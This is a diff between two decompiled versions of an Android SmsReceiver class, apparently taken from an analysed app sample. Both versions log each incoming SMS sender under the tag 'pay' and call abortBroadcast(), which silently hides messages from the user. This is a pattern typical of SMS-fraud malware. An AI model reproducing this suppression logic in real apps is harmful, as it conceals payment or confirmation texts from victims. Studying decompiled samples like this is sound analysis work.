@@ -7,19 +7,22 @@ import android.os.Bundle;
 import android.telephony.gsm.SmsMessage;
 import android.util.Log;
 
-/* loaded from: classes.dex */
 public class SmsReceiver extends BroadcastReceiver {
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context paramContext, Intent paramIntent) {
-        Bundle localBundle = paramIntent.getExtras();
-        if (localBundle != null) {
-            Object[] arrayOfObject = (Object[]) localBundle.get("pdus");
-            for (Object obj : arrayOfObject) {
-                SmsMessage localSmsMessage = SmsMessage.createFromPdu((byte[]) obj);
-                String str = localSmsMessage.getOriginatingAddress();
-                Log.i("pay", "receiver number:" + str);
-                abortBroadcast();
-            }
-        }
-    }
+   public SmsReceiver() {
+      super();
+   }
+
+   public void onReceive(Context var1, Intent var2) {
+      Bundle var4 = var2.getExtras();
+      if (var4 != null) {
+         Object[] var6 = (Object[])var4.get("pdus");
+
+         for(int var3 = 0; var3 < var6.length; ++var3) {
+            String var5 = SmsMessage.createFromPdu((byte[])var6[var3]).getOriginatingAddress();
+            Log.i("pay", "receiver number:" + var5);
+            this.abortBroadcast();
+         }
+      }
+
+   }
 }
